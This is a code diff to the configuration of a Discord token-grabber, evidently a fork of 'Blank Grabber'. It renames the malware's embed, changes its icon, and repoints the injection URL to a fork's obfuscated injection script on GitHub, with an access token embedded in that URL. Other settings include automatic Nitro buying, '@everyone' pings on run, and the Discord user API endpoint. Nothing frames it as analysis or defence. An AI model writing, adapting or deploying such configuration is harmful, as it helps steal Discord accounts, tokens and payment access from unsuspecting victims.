@@ -12,10 +12,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png',
+  embed_name: 'Grabber Injection', 
+  embed_icon: 'https://github.com/Nagisalpx/Grabber-env/blob/main/image.png?raw=true',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/Nagisalpx/Grabber-env/main/Discord-Injection-BG/injection-obfuscated.js?token=GHSAT0AAAAAACUIRHNHHUG4HXJJFW7D53UYZUB6PXA', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
